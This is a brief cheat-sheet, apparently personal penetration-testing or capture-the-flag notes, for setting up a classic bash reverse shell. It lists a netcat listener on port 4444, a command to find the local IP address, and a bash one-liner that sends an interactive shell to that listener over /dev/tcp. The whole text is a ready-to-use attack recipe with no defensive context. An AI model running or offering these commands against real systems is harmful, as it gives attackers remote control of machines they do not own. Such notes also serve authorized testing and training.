1) 

- `nc -lvnp 4444`

2) 

You need to get your IP :

- `ip -br a`

# Classic /bin/bash reverse shell

- `bash -c 'bash -i >& /dev/tcp/<ip_addr>/4444 0>&1'`

